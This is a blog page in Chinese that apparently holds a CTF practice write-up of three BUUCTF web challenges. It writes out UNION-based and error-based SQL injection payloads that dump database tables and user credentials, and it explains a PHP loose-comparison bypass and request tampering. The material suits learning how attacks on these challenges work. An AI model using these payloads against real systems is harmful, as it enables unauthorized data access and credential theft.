@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>buuctf2 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="[极客大挑战 2019]LoveSQL这关之前有做过类似的，但是这个应该是升级版 进过尝试可知注入类型为单引号注入，用万能密码尝试登入  发现这次flag不在里面了，那我们尝试一下获取他的数据库信息 法1： union联合注入 确认返回字段数：1&#39; union select 1,2,3# 爆库：1&#39; union select 1,2,database()# 爆表：1&#39; un">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf2">
+<meta property="og:url" content="http://example.com/2021/04/13/buuctf2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="[极客大挑战 2019]LoveSQL这关之前有做过类似的，但是这个应该是升级版 进过尝试可知注入类型为单引号注入，用万能密码尝试登入  发现这次flag不在里面了，那我们尝试一下获取他的数据库信息 法1： union联合注入 确认返回字段数：1&#39; union select 1,2,3# 爆库：1&#39; union select 1,2,database()# 爆表：1&#39; un">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/C:/Users/Lenovo/Desktop/blog/hexo/source_posts/buuctf2/2.png">
+<meta property="og:image" content="http://example.com/C:/Users/Lenovo/Desktop/blog/hexo/source_posts/buuctf2/5.png">
+<meta property="og:image" content="http://example.com/C:/Users/Lenovo/Desktop/blog/hexo/source_posts/buuctf2/6.png">
+<meta property="og:image" content="http://example.com/C:/Users/Lenovo/Desktop/blog/hexo/source_posts/buuctf2/1.png">
+<meta property="og:image" content="http://example.com/C:/Users/Lenovo/Desktop/blog/hexo/source_posts/buuctf2/3.png">
+<meta property="og:image" content="http://example.com/C:/Users/Lenovo/Desktop/blog/hexo/source_posts/buuctf2/4.png">
+<meta property="og:image" content="http://example.com/C:/Users/Lenovo/Desktop/blog/hexo/source_posts/buuctf2/7.png">
+<meta property="og:image" content="http://example.com/C:/Users/Lenovo/Desktop/blog/hexo/source_posts/buuctf2/8.png">
+<meta property="og:image" content="http://example.com/buuctf2.assets/9.png">
+<meta property="og:image" content="http://example.com/buuctf2.assets/13.png">
+<meta property="og:image" content="http://example.com/buuctf2.assets/10.png">
+<meta property="og:image" content="http://example.com/buuctf2.assets/11.png">
+<meta property="og:image" content="http://example.com/buuctf2.assets/12.png">
+<meta property="article:published_time" content="2021-04-13T10:42:02.000Z">
+<meta property="article:modified_time" content="2021-04-29T08:03:00.713Z">
+<meta property="article:author" content="linbei">
+<meta property="article:tag" content="刷题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/C:/Users/Lenovo/Desktop/blog/hexo/source_posts/buuctf2/2.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-buuctf2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/04/13/buuctf2/" class="article-date">
+  <time datetime="2021-04-13T10:42:02.000Z" itemprop="datePublished">2021-04-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      buuctf2
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>这关之前有做过类似的，但是这个应该是升级版</p>
+<p>进过尝试可知注入类型为单引号注入，用万能密码尝试登入</p>
+<p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\2.png" alt="2"></p>
+<p>发现这次flag不在里面了，那我们尝试一下获取他的数据库信息</p>
+<p><strong>法1：</strong></p>
+<p><strong>union联合注入</strong></p>
+<p>确认返回字段数：<code>1&#39; union select 1,2,3#</code></p>
+<p>爆库：<code>1&#39; union select 1,2,database()#</code></p>
+<p>爆表：<code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;#</code></p>
+<p>爆列：<code>1&#39; union select 1,2,group_cooncat(columns) from information_schema.columns where table_name=&#39;geekuser&#39;#</code></p>
+<p>爆值：<code>1&#39; union select 1,2,group_concat(username,password) from geekuser#</code></p>
+<p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\5.png" alt="5"></p>
+<p>发现该表下只有一行数据：id=1,username=admin,password=“字符串”</p>
+<p>于是我们再查一下<code>l0ve1ysq1</code>表——<code>1&#39; union select 1,2,group_concat(username,password) from l0ve1ysq1#</code></p>
+<p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\6.png" alt="6"></p>
+<p><strong>法2：</strong></p>
+<p>报错注入：</p>
+<p>由于输入<code>1&#39;</code> 会返回报错信息，尝试报错注入：</p>
+<p>爆库：<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,database()))#</code></p>
+<p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\1.png" alt="1"></p>
+<p>爆表：<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;)))#</code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\3.png" alt="3"></p>
+<p>爆列：<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;geekuser&#39;)))#</code></p>
+<p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\4.png" alt="4"></p>
+<p>爆值：<code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from geekuser where id=1)))#</code></p>
+<p>发现返回一串字符串，但是flag不在其中，查看另一个表</p>
+<p><code>1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from l0ve1ysq1 where id=1)))#</code><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\7.png" alt="7"></p>
+<p>发现由于报错注入的返回长度的限制，后续的值没有全部回显在页面上，因此要用substr函数去截，还挺麻烦的，后续的就不写了。</p>
+<h1 id="ACTF2020-新生赛-BackupFile（文件备份-弱口令绕过）"><a href="#ACTF2020-新生赛-BackupFile（文件备份-弱口令绕过）" class="headerlink" title="[ACTF2020 新生赛]BackupFile（文件备份+弱口令绕过）"></a>[ACTF2020 新生赛]BackupFile（文件备份+弱口令绕过）</h1><p>打开容器发现什么也没有，查看源码也没有，御剑扫描也没有，看到题目提示备份文件，联想到之前有做过以<code>.bak</code>为后缀的备份文件的题</p>
+<p><img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\buuctf2\8.png" alt="8"></p>
+<p>打开文件发现一段源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码审计：将get的值赋给参数key，先判断key是否为数字，不是则退出，是则通过intval获取参数中的整数部分，然后和变量str的值进行对比，相等则输出flag。</p>
+<p><strong>sp：</strong></p>
+<p>由于<code>php</code>弱口令的特性，字符串和数字比较使用==时,字符串会先转换为数字类型再比较</p>
+<p>var_dump(‘a’ == 0);//true                   ——此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0<br>var_dump(‘123a’ == 123);//true        ——这里’123a’会被转换为123</p>
+<p><code>php</code>中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。<br>举例：</p>
+<p>var_dump(‘a123’ == 123);//false</p>
+<p>var_dump(‘1233a’ == 123);//false</p>
+<p>var_dump(‘123a1’ == 123);//true</p>
+<p>因此这里我们只需要构造payload：?key=123即可</p>
+<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>点开容器，进入PAYFLAG页面，查看源码：<img src="/buuctf2.assets/9.png" alt="9"></p>
+<p>我们需要上传money和password，根据网页提示money=100000000，password=404a绕过is_numeric和php弱口令相等</p>
+<p><img src="/buuctf2.assets/13.png" alt="13"></p>
+<p>没什么内容，抓包试试</p>
+<p><img src="/buuctf2.assets/10.png" alt="10"></p>
+<p>修改user的值为student，但是这样也不行，那改成1：<img src="/buuctf2.assets/11.png" alt="11"></p>
+<p>太长了尝试改用科学计数法<img src="/buuctf2.assets/12.png" alt="12"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/04/13/buuctf2/" data-id="cknhjfgs10000n0vu3hc2efps" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/04/19/i%E6%98%A5%E7%A7%8B1/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          i春秋
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/04/08/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">PHP伪协议</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" rel="tag">C语言学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA%E2%80%94labs/" rel="tag">DVWA—labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" rel="tag">MySQL数据库的搭建与启动</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bugku/" rel="tag">bugku</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa%E2%80%94labs/" rel="tag">dvwa—labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="tag">mysql数据库的使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/upload-labs/" rel="tag">upload-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" rel="tag">数据库的增删改查</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 15px;">C语言学习</a> <a href="/tags/DVWA-labs/" style="font-size: 17.5px;">DVWA-labs</a> <a href="/tags/DVWA%E2%80%94labs/" style="font-size: 10px;">DVWA—labs</a> <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 12.5px;">PHP</a> <a href="/tags/bugku/" style="font-size: 10px;">bugku</a> <a href="/tags/dvwa%E2%80%94labs/" style="font-size: 10px;">dvwa—labs</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 12.5px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 12.5px;">web渗透</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 15px;">刷题</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/05/13/blog/">blog</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/29/i%E6%98%A5%E7%A7%8B2/">i春秋</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/19/i%E6%98%A5%E7%A7%8B1/">i春秋</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/13/buuctf2/">buuctf2</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/08/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 linbei<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
